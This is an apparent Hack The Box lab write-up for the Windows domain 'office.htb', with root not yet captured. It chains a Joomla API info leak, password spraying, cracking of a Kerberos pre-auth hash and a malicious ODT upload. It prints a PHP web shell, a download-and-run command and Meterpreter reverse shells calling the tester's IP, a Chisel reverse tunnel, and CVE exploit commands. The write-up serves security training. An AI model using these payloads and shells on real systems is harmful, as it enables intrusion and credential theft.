---
tags:
  - box
platform: HTB
os: Windows
difficulty:
date_completed:
mitre_attack: T1590, T1087.002, T1190, T1040, T1110.002, T1505.003, T1203, T1053.005, T1552.001
status: in-progress
---

## Target

**IP Address:**

## Recon

### Port Scan

**Ports Listing:**

| Port | Service | Version |
|---|---|---|
| 53 | DNS | Simple DNS Plus |
| 80 | HTTP | Apache httpd 2.4.56 Win64 OpenSSL/1.1.1t PHP/8.0.28 |
| 88 | Kerberos | Microsoft Kerberos |
| 139 | Netbios | Microsoft netbios-ssn |
| 389 | ldap | Microsoft Active Directory LDAP |
| 443 | ssl/http | Apache httpd 2.4.56 OpenSSL/1.1.1t PHP/8.0.28 |
| 445 | microsoft-ds | ? |
| 464 | kpasswd5 | ? |
| 593 | ncacn_http | Microsoft RPC over HTTP 1.0 |
| 636 | ssl/ldap | Microsoft AD LDAP |
| 3268 | ssl/ldap | Microsoft AD LDAP |
| 3269 | ssl/ldap | Microsoft AD LDAP |
| 5985 | http | Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |

#### Findings

From Nmap port 389: Domain: `office.htb`

Robots entries:
```
http-robots.txt: 16 disallowed entries
/joomla/administrator/ /administrator/ /api/ /bin/
/cache/ /cli/ /components/ /includes/ /installation/
/language/ /layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
```

Plan: make a username list with `username-anarchy`, make a password list with `cupp`.

**DNS:**
- `dig axfr`: zone transfer failed
- `dig any`: no info
- `dig any @10.129.191.227 office.htb`:
```
;; ANSWER SECTION:
office.htb.        600  IN  A    10.250.0.30
office.htb.        600  IN  A    10.129.230.226
office.htb.        3600 IN  NS   dc.office.htb.
office.htb.        3600 IN  SOA  dc.office.htb. hostmaster.office.htb. 97 900 600 86400 3600
```

**HTTP:** Joomla site - run joomla-bruteforce. Directory listing found: administrator, api, aux, cache, com1,2,3, images, layouts, libraries, lpt1,2, media, modules, nul, phpmyadmin, plugins, prn, templates, tmp, webalizer. Homepage has a login page. All blogs are written by "Tony Stark," possibly a real account name.

**LDAP:**
```bash
ldapsearch -LLL -x -H ldap://10.129.191.227 -b '' -s base '(objectClass=*)'
```
```
Operations error (1)
Additional information: 000004DC: LdapErr: DSID-0C090CF8, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4f7c
```

**SMB:** smbmap and client null sessions - access denied, no null sessions.

**RPC - 593:**
```bash
impacket-rpcdump 10.129.191.227 -port 593 > rpcDumpScan
grep -E 'MS-EFSRPC|MS-RPRN|MS-PAR' rpcDumpScan
```
Protocols found: [MS-NRPC] Netlogon Remote Protocol, [MS-RAA] Remote Authorization API Protocol, [MS-LSAT] Local Security Authority (Translation Methods) Remote, [MS-DRSR] Directory Replication Service (DRS) Remote Protocol.

**KRB:**
```bash
impacket-GetNPUsers -dc-ip 10.129.191.227 office.htb/
```
```
[-] Error in searchRequest -> operationsError: 000004DC: LdapErr: DSID-0C090CF8, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4f7c
```

```bash
kerbrute userenum --dc 10.129.191.227 -d office.htb tony.txt
```
```
2024/04/16 21:42:22 >  Using KDC(s):
2024/04/16 21:42:22 >   10.129.191.227:88
2024/04/16 21:42:23 >  [+] VALID USERNAME: tstark@office.htb
2024/04/16 21:42:23 >  Done! Tested 14 usernames (1 valid) in 1.153 seconds
```

I made a username list using what I knew from the blog author "Tony Stark," using username-anarchy: `username-anarchy Tony Stark > tony.txt`. I ran that against the domain using kerbrute userenum and got a valid user back: `tstark@office.htb`. Next: use cupp with this info to try and brute force the password.

## Enumeration

I looked up how to find the Joomla version and found it at `<ip>/administrator/manifests/files/joomla.xml`:

```xml
<extension type="file" method="upgrade">
<name>files_joomla</name>
<version>4.2.7</version>
<creationDate>2023-01</creationDate>
...
</extension>
```

Found a vulnerability in Joomla version 4.2.7 that allows reading some config files without authentication. Navigating to `api/index.php/v1/config/application?public=true` returns everything there, including a possible password:

`root:H0lOgrams4reTakIng0Ver754!`

Found a secret on the next page for something: `HW1uCFFJuBcloACa`

Using the same vulnerability I found a page at `/api/index.php/v1/users?public=true` that reveals Tony Stark's username, that he is Administrator, and his email is `Administrator@holography.htb`.

Found a list of components at `/administrator/components`. Possible vulnerable components:
- Joomla! Component com_newsfeeds 1.0 - 'feedid' SQL Injection (php/webapps/48202.txt)
- Joomla! Component com_redirect 1.5.19 - Local File Inclusion (php/webapps/35097.txt)

Ran kerbrute against the machine again with a bigger user list (xato top 10 million wordlist in SecLists) and got a few more matches: `administrator`, `etower`, `ewhite`, `dwolfe`, `dlanor`, `dmichael`, `hhogan`.

Running crackmapexec against the machine over the SMB port got a hit on valid creds:

```bash
crackmapexec smb 10.129.230.226 -u ../users -p 'H0lOgrams4reTakIng0Ver754!'
```
```
SMB  10.129.230.226  445  DC  [*] Windows 10.0 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
SMB  10.129.230.226  445  DC  [-] office.htb\administrator:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE
SMB  10.129.230.226  445  DC  [-] office.htb\etower:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE
SMB  10.129.230.226  445  DC  [-] office.htb\ewhite:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE
SMB  10.129.230.226  445  DC  [+] office.htb\dwolfe:H0lOgrams4reTakIng0Ver754!
```

Enumerated shares with the recovered account:

```bash
crackmapexec smb 10.129.230.226 -d office.htb -u dwolfe -p 'H0lOgrams4reTakIng0Ver754!' --shares
```
```
SMB  10.129.230.226  445  DC  [+] Enumerated shares
Share           Permissions  Remark
-----           -----------  ------
ADMIN$                       Remote Admin
C$                           Default share
IPC$            READ         Remote IPC
NETLOGON        READ         Logon server share
SOC Analysis    READ
SYSVOL          READ         Logon server share
```

Connected to the "SOC Analysis" share:

```bash
smbclient -U office.htb/dwolfe \\\\10.129.230.226\\SOC\ Analysis
```

Listed the files and found a pcap that seems to have been captured on their network. Opened it in Wireshark - mostly TCP, TLS, DNS, and a little SMB traffic, but 2 lines of KRB5 traffic containing a user (`tstark`) trying to authenticate to the domain.

Reference on extracting hashes/passwords from Kerberos pre-auth packets: https://vbscrub.com/2020/02/27/getting-passwords-from-kerberos-pre-authentication-packets/

Pulled the AS-REQ pre-auth hash from the traffic:
```
a16f4806da05760af63c566d566f071c5bb35d0a414459417613a9d67932a6735704d0832767af226aaa7360338a34746a00a3765386f5fc
```

This is a Kerberos hash using AES-256 encryption - crackable with Hashcat.

**Hashcat mode reference for these hash types** (identified by the number between the dollar signs):
- 13100 - Type 23 - `$krb5tgs$23$`
- 19600 - Type 17 - `$krb5tgs$17$`
- 19700 - Type 18 - `$krb5tgs$18$`
- 18200 - AS-REP Type 23 - `$krb5asrep$23$`

Hashcat needs more than just the ciphertext - the parameters before it (`$krb5pa$18$tstark$SCRM.LOCAL$`) matter too: `krb5pa` = Kerberos 5 pre-auth, `18` = encryption type (AES-256), then username and domain (both readable in the rest of the AS-REQ packet in Wireshark).

## Exploitation

```bash
hashcat -m 19900 tstarkHash rockyou.txt
```

Cracked: `tstark:playboy69`

Used `administrator:playboy69` (same password) to log in to the Joomla admin page. From there, edited the site template to add a PHP one-liner shell to the index page:

```php
<?php if (isset($_GET['cmd'])) system($_GET['cmd']); ?>
```

```
powershell -c Invoke-WebRequest http://10.10.14.216:5555/backup.exe -OutFile backup.exe
```

Using this RCE, uploaded a Meterpreter payload and got a shell back in Metasploit:

```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp -o backup.exe -f exe LHOST=10.10.14.216 LPORT=4444
```

Working on getting things to run as tstark (using the `playboy69` password) instead of the web service account:

```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp -o backupUser.exe -f exe LHOST=10.10.14.216 LPORT=4443
```

Created creds in PowerShell for tstark:
```powershell
$name = 'office\tstark'
$pass = 'playboy69'
$secpass = ConvertTo-SecureString $pass -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential($name,$secpass)
```

Found a GitHub project with an open-source `runas` that has a password parameter built in: https://github.com/antonioCoco/RunasCs

Uploaded the exe to the machine and ran it to get a Meterpreter shell as tstark:

```
RunasCs.exe tstark playboy69 backupUser.exe
```

Found the user flag at `C:\Users\tstark\Desktop\user.txt`:

```powershell
type user.txt
```

## Privilege Escalation

Now to do enumeration for privesc.

**WinPEAS output (first run):**
```
PPotts is Logged in Currently
Check MySQL
RegPath: HKLM\Software\Classes\htmlfile\shell\open\command
  RegPerms: Registry Editors [FullControl]
  Folder: C:\Program Files\Internet Explorer
  File: C:\Program Files\Internet Explorer\iexplore.exe %1 (Unquoted and Space detected)
RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects\{1FD49718-1D00-4B19-AF5F-070AF6D5D54C}
  RegPerms: Registry Editors [FullControl]
  Folder: C:\Program Files (x86)\Microsoft\Edge\Application\121.0.2277.112\BHO
  File: ...\ie_to_edge_bho_64.dll (Unquoted and Space detected)
RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects\{31D09BA0-12F5-4CCE-BE8A-2923E76605DA}
  RegPerms: Registry Editors [FullControl]
  Folder: C:\Program Files\Microsoft Office\root\Office16
  File: ...\OCHelper.dll (Unquoted and Space detected)
Folder: C:\windows\tasks
  FolderPerms: Authenticated Users [WriteData/CreateFiles]
Folder: C:\windows\system32\tasks
  FolderPerms: Authenticated Users [WriteData/CreateFiles]
```

Re-ran WinPEAS because it errored out the first time, this time outputting to a file through Metasploit:

```
execute -f winPEASx64.exe -a 'log'
```

```
Found Misc-Code assigning passwords (regex matches):
  C:\xampp\apache\conf\extra\httpd-ssl.conf: password: `xxj31ZMTZzkVA'.
Found Raw Hashes-sha1 (regex matches):
  C:\Users\All Users\Microsoft\Windows Defender\Platform\4.18.23050.5-0\ThirdPartyNotices.txt: 6aba23f4a8628d599a9ef7fa4811c4ff6e4070e2
```

Ran the local exploit suggester (`post/multi/recon/local_exploit_suggester`) through Meterpreter and got 4 hits:
- `exploit/windows/local/bypassuac_sdclt`
- `exploit/windows/local/cve_2020_1048_printerdemon`
- `exploit/windows/local/cve_2020_1337_printerdemon`
- `exploit/windows/local/ms16_032_secondary_logon_handle_privesc`

Found that HHogan is part of the Remote Management group:

```powershell
net localgroup "Remote Management Users"
```
```
Members
-------------------------------------------------------------------------------
HHogan
```

Looking back at ports where I landed on the box, there's an "internal" folder being hosted somewhere, probably only locally. Looking at the files, it's a website used for applying to the "holography" company - a PHP script allows applying with a file upload function. It filters by file type, but the filtering looks bypassable (e.g. `shell.php.docx`).

Found where the site is hosted - internally on port 8083 (found in the Apache config files):
```apache
Listen 8083
<VirtualHost *:8083>
    DocumentRoot "C:\xampp\htdocs\internal"
    ServerName localhost:8083
```

The Metasploit port forward option wasn't working at all, so switched to Chisel (easiest for Windows, most suggested online):

```bash
./chisel_1.9.1_linux_amd64 server -p 5555 --reverse
chisel_1.9.1_windows_amd64.exe client 10.10.14.216:5555 R:8083:127.0.0.1:8083
```

Navigated to `http://localhost:8083` and got the application website seen in the filesystem. Tried uploading a PHP file named `test.php.docx` - it uploaded, but downloaded instead of running when accessed.

Going back to the code, the site allows uploads of `doc`, `docx`, and `odt` files. Researched ODT files and found two relevant CVEs that may allow uploading a malicious ODT file to retrieve NTLM hashes when opened, or achieve code execution: `CVE-2018-10583` and `CVE-2023-2255`.

Found a tool that creates a malicious ODT file: https://github.com/rmdavy/badodf/blob/master/badodt.py

Got an NTLM hash back:
```
PPotts::OFFICE:3420f449abeebe24:7BD55D61F5BC46CD7DBDF28F24AE8971:0101...(truncated)
```

Couldn't crack the hash or use it to pass, so tried the other CVE.

**CVE-2023-2255 works!** The vulnerability takes advantage of an issue in ODT files where, when a user opens them, certain editor components can be exploited to reach out to external links and load them without prompting the user.

Found a PoC that creates a vulnerable ODT file with an embedded command: https://github.com/elweth-sec/CVE-2023-2255

```bash
python3 cve-2023-2255.py --cmd 'C:\Users\Public\backupPepper.exe' --output 'resume.odt'
```

Uploaded a Meterpreter shell to the box, had the ODT file point to that exe, uploaded the ODT file, and waited. After about a minute, got a session back as **PPotts**!

After enumerating PPotts's home directory, found a PowerShell script inside her Music folder being run every two minutes (grabbing applications). Queried who owned the file - PPotts owned it and was running it too (added a line `whoami > C:\Users\Public\Documents\test.txt"` to confirm).

Investigated the scheduled task behind this:

```powershell
schtasks /query
```
```
TaskName                                 Next Run Time          Status
======================================== ====================== ===============
OneDrive Reporting Task-S-1-5-21-1199398 4/25/2024 2:19:31 AM   Ready
Review Job Applications                  4/24/2024 2:18:45 PM   Ready
```

```powershell
schtasks /query /TN "Review Job Applications" /V
```

Key details from the verbose output: runs `powershell.exe C:/users/ppotts/music/job_offering.` as user **ppotts**, but authored by **Administrator**. Tried to change the run level/user, but that needs an admin prompt.

Checked PowerShell history:
```powershell
cat (Get-PSReadlineOption).HistorySavePath
```
```
cd c:\programdata
iwr 10.10.14.41/job.txt -o job.txt
```

Searched for `job.txt` in that location and system-wide - not found directly, but a broader search for `*job*` turned up:
```
C:\Program Files\Wireshark\snmp\mibs\Job-Monitoring-MIB
C:\Users\PPotts\AppData\Roaming\Microsoft\Windows\Recent\job.lnk
C:\Users\PPotts\AppData\Roaming\Microsoft\Windows\Recent\job_offering.lnk
C:\Users\PPotts\Music\job_offering.ps1
```

Ran WinPEAS again as PPotts, found a few more interesting reg paths:
```
RegPath: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
RegPerms: ppotts [FullControl]
Key: OneDrive
File: C:\Program Files\Microsoft OneDrive\OneDrive.exe /background (Unquoted and Space detected)

RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
RegPerms: Registry Editors [FullControl]
Key: Common Startup
Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup (Unquoted and Space detected)

RegPath: HKLM\Software\Classes\htmlfile\shell\open\command
RegPerms: Registry Editors [FullControl]
File: C:\Program Files\Internet Explorer\iexplore.exe %1 (Unquoted and Space detected)

Folder: C:\Users\PPotts\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
FolderPerms: ppotts [AllAccess]
```

Interesting exe found in the home folder: `C:\Users\PPotts\AppData\Local\Microsoft\Teams\Update.exe` - ppotts has AllAccess.

Checked the clipboard as PPotts (`Get-Clipboard`) - nothing returned.

## Flags

**User:** captured (`C:\Users\tstark\Desktop\user.txt` as tstark)

**Root/System:** not yet captured - currently investigating the "Review Job Applications" scheduled task (runs as ppotts, authored by Administrator) and the writable Startup folder / unquoted service paths as the likely next privesc vector

## Lessons Learned

This box chained a lot of separate small issues into full compromise: unauthenticated Joomla API info disclosure leaked a password, that password was reused for the admin web account, cracking an AS-REQ pre-auth hash pulled from an old pcap gave a second set of valid domain creds, and a client-side ODT exploit (CVE-2023-2255) got onto a second user's session entirely through a "job application" upload form. Worth remembering: SOC/analyst shares with old pcaps are worth searching for embedded Kerberos pre-auth traffic - it's crackable offline just like a captured hash, no live MITM required.
